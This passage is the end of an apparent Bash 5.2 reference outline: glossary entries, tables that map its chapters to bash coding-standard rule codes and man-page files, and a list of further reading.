- **pipeline** — `cmd1 | cmd2`; kernel-allocated pipe between processes.
- **PID** — process identifier.
- **POSIX** — IEEE 1003.1 / SUSv4 specification.
- **process group** — set of processes that receive terminal signals together.
- **process substitution** — `<(cmd)` or `>(cmd)`; gives `/dev/fd/N` path.
- **PTY** — pseudo-terminal; master/slave pair for terminal emulation.
- **readline** — GNU library for command-line editing.
- **REPL** — read-eval-print loop; the interactive shell.
- **session** — collection of process groups sharing a controlling terminal.
- **shopt** — shell option (distinct from `set -o`).
- **simple command** — single command with arguments and redirections.
- **subshell** — forked child shell; variable changes do not propagate to parent.
- **trap** — handler for signals or pseudo-signals (EXIT, ERR, DEBUG, RETURN).
- **TTY** — terminal device.
- **word** — token after expansion; may be empty.
- **word splitting** — splitting unquoted expansions on IFS.

## Appendix O — Cross-Reference: Sections to BCS Sections

Map from this document's chapters to the relevant BCS coding-standard
sections, resolved where possible to specific `BCS####` codes.

The left-hand BCS section is the standard's Section number (Section 01
= "Script Structure"); the right-hand BCS#### codes are individual
rules within that section. Codes were verified against the
`./bcs codes` listing for bash-coding-standard 5.2-aligned BCS.

| BCS Section | Title | Reference chapters | Key BCS codes |
|-------------|-------|-------------------|---------------|
| §01 | Script Structure & Layout | §22.1, §22.2, §22.16, parts of §2 | BCS0101 (strict mode), BCS0102 (shebang), BCS0103 (script metadata), BCS0104 (FHS compliance), BCS0105 (global variables), BCS0106 (file extensions), BCS0107 (function organisation), BCS0108 (main function), BCS0109 (`#fin` end marker), BCS0110 (cleanup and traps), BCS0111 (config file loading) |
| §02 | Variables | Part IV (chapters 4.1–4.14) | BCS0201 (type-specific declarations), BCS0202 (variable scoping), BCS0203 (naming conventions), BCS0204 (constants and environment), BCS0205 (readonly patterns), BCS0206 (arrays), BCS0207 (parameter expansion), BCS0208 (boolean flags), BCS0209 (derived variables) |
| §03 | Strings & Quoting | Part III (3.4–3.9), §5.4 | BCS0301 (quoting fundamentals), BCS0302 (command substitution), BCS0303 (quoting in conditionals), BCS0304 (here documents), BCS0305 (printf patterns), BCS0306 (`@Q` parameter quoting), BCS0307 (anti-patterns) |
| §04 | Functions | Part IX, Part X | BCS0401 (function definition), BCS0402 (function names), BCS0403 (main function), BCS0404 (function export), BCS0405 (production optimisation), BCS0406 (dual-purpose scripts), BCS0407 (library patterns), BCS0408 (dependency management), BCS0409 (bash version detection), BCS0410 (recursive function state), BCS0411 (subshell return-value patterns) |
| §05 | Control Flow | Part VII, Part VIII | BCS0501 (conditionals), BCS0502 (case statements), BCS0503 (loops), BCS0504 (process substitution), BCS0505 (arithmetic operations), BCS0506 (floating-point) |
| §06 | Error Handling | Part XIII | BCS0601 (exit on error), BCS0602 (exit codes), BCS0603 (trap handling), BCS0604 (checking return values), BCS0605 (error suppression), BCS0606 (conditional declarations) |
| §07 | I/O & Messaging | Part VI, Part XIV | BCS0701 (message control flags), BCS0702 (stdout vs stderr), BCS0703 (core messaging system), BCS0704 (usage documentation), BCS0705 (echo vs messaging functions), BCS0706 (color definitions), BCS0707 (TUI basics), BCS0708 (terminal capabilities), BCS0709 (yes/no prompt), BCS0710 (standard icons), BCS0711 (combined redirection) |
| §08 | Command-Line Processing | Part XV, §22.3 | BCS0801 (standard parsing pattern), BCS0802 (version output), BCS0803 (argument validation), BCS0804 (parsing location), BCS0805 (short option bundling), BCS0806 (standard options) |
| §09 | File Operations | §1.3, §6.x, §17.x, §22.10, §22.13 | BCS0901 (safe file testing), BCS0902 (wildcard expansion), BCS0903 (process substitution), BCS0904 (here documents), BCS0905 (input redirection), BCS0906 (`find` subshell pitfalls) |
| §10 | Security | Part XX, §22.9, §22.13 | BCS1001 (SUID/SGID prohibition), BCS1002 (PATH security), BCS1003 (IFS safety), BCS1004 (eval avoidance), BCS1005 (input sanitisation), BCS1006 (temporary file handling), BCS1007 (environment scrubbing before exec) |
| §11 | Concurrency | Part XVI, Part XVII, §22.11, §22.12 | BCS1101 (background job management), BCS1102 (parallel execution), BCS1103 (wait patterns), BCS1104 (timeout handling), BCS1105 (exponential backoff) |
| §12 | Style & Development | Part XXI, §22.16, §22.17 | BCS1201 (code formatting), BCS1202 (comments), BCS1203 (blank lines), BCS1204 (section comments), BCS1205 (language best practices), BCS1206 (static analysis directives), BCS1207 (debugging), BCS1208 (dry-run pattern), BCS1209 (testing support), BCS1210 (progressive state management), BCS1211 (utility functions), BCS1212 (Makefile installation), BCS1213 (date and time formatting) |
| §13 | Environment | §1.5, §2.5–§2.6, §22.9 | Section 13 is the environment-configuration reference (BCS configuration variables, backend model overrides, credentials, runtime behaviour). It is reference-form rather than rule-coded; consult `data/13-environment.md` for the per-variable definitions. |

### Reading the cross-reference

A chapter may legitimately resolve to multiple BCS sections (the
strict-mode preamble, §22.1, hooks both BCS0101 and BCS0102; the
argument-parsing skeleton in §22.3 hooks the entire §08 family). When
in doubt, the canonical recipe lives in the reference chapter; the
*rule* stating that the recipe is mandatory lives in the BCS code.

The Section-98 reserved namespace (codes `BCS98xx`) is set aside for
user-supplied rules (see CLAUDE.md → "User Rule Extensions") and is
not cross-referenced here — by design, those rules are organisation-
specific and outside the upstream reference.

**See also**: Appendix P (Cross-Reference: Sections to BCS-bash files)
for the parallel mapping into the bash-5.2 reference; `data/BASH-CODING-STANDARD.md`
for the full text of every BCS rule cited above; `./bcs codes -T core`
for the subset of rules whose violations are reported as `[ERROR]`.

## Appendix P — Cross-Reference: Sections to BCS-bash Files

Map from chapters to the strict-mode rewritten man-page reference.

| Chapter | BCS-bash File |
|---------|---------------|
| §1.x | (Unix model — not bash-specific) |
| §2.4–§2.7 | `06_INVOCATION.md`, `04_OPTIONS.md` |
| §3.4–§3.9 | `11_QUOTING.md` |
| §3.10 | `09_SHELL-GRAMMAR/` |
| §4.x | `12_PARAMETERS/` |
| §5.x | `13_EXPANSION/` |
| §6.x | `14_REDIRECTION/`, `09_SHELL-GRAMMAR/02_Pipelines.md` |
| §7.x | `09_SHELL-GRAMMAR/04_Compound-Commands.md` |
| §8.1–§8.8 | `18_CONDITIONAL-EXPRESSIONS.md` |
| §8.9–§8.13 | `17_ARITHMETIC-EVALUATION.md` |
| §9.x | `16_FUNCTIONS.md` |
| §10.x | `30_SHELL-BUILTIN-COMMANDS/02_dot-source.md` |
| §11.x | `25_JOB-CONTROL.md`, `21_COMMAND-EXECUTION-ENVIRONMENT.md` |
| §12.x | `24_SIGNALS.md`, `30_SHELL-BUILTIN-COMMANDS/48_trap.md` |
| §13.x | `23_EXIT-STATUS.md`, `30_SHELL-BUILTIN-COMMANDS/43_set.md` |
| §14.x | `30_SHELL-BUILTIN-COMMANDS/` (read, printf, mapfile) |
| §15.x | `30_SHELL-BUILTIN-COMMANDS/` (getopts) |
| §17.x | `09_SHELL-GRAMMAR/05_Coprocesses.md` |
| §18.x | `27_READLINE/`, `28_HISTORY.md`, `26_PROMPTING.md` |
| §22.x | `30_SHELL-BUILTIN-COMMANDS/` (various) |
| §23.x | (Cross-shell — not in BCS-bash) |
| §24.x | (Internals — see bash source) |
| §25.x | (Forward-looking — see Bash 5.3 NEWS) |

## Appendix Q — Further Reading

Authoritative resources for deeper study.

- **GNU Bash Reference Manual** — `https://www.gnu.org/software/bash/manual/`. The canonical authoritative source. Different organisation from `man bash`; tends to be more readable.
- **bash(1) man page** — local; the on-disk reference.
- **Greg's Wiki: BashFAQ, BashPitfalls, BashGuide** — `https://mywiki.wooledge.org/`. Greg Wooledge's site catalogues every wrong way to write Bash, with detailed explanations. BashFAQ and BashPitfalls are mandatory reading.
- **ShellCheck wiki** — `https://www.shellcheck.net/wiki/`. Every `SC####` warning has a page explaining the rule, the rationale, and the fix.
- **Bash Hackers Wiki** — `https://wiki.bash-hackers.org/`. Community reference; quality varies but the parameter-expansion and array pages are excellent.
- **bash-completion** — `https://github.com/scop/bash-completion`. Reference implementations of completion functions.
- **bats-core documentation** — `https://bats-core.readthedocs.io/`. The de facto bash test framework.
- **GNU coreutils manual** — `https://www.gnu.org/software/coreutils/manual/`. The external commands you'll compose. `info coreutils` is more thorough than the man pages.
- **POSIX 1003.1 Shell & Utilities** — `https://pubs.opengroup.org/onlinepubs/9699919799/`. The portable subset.
- **bash source repository** — `https://git.savannah.gnu.org/cgit/bash.git/`. The implementation truth.
- **bug-bash mailing list** — `https://lists.gnu.org/archive/html/bug-bash/`. Where bash development happens; Chet Ramey is responsive.
- **"Getting Serious about Bash"** — [`promo/getting-serious-about-bash.md`](promo/getting-serious-about-bash.md). Gary Dean's polemic on the state of professional Bash.
- **BCS coding standard** — [`../data/BASH-CODING-STANDARD.md`](../data/BASH-CODING-STANDARD.md). The actionable rules.
- **BCS-bash strict-mode reference** — [`BCS-bash/`](BCS-bash/). Bash 5.2 man page rewritten under strict-mode assumptions.

What to skip: TLDP "Advanced Bash-Scripting Guide" (last meaningful update 2014; teaches backticks); freeCodeCamp / W3Schools / GeeksforGeeks / TutorialsPoint Bash content (uniformly broken).

---

*End of reference.*

*This document is a structural reference guide — a comprehensive outline with briefing notes describing the intended content of each section. It identifies what an authoritative Bash 5.2+ reference must cover and how to organise it. Filling out each chapter into a fully written reference is the work that follows from this structure.*

#fin
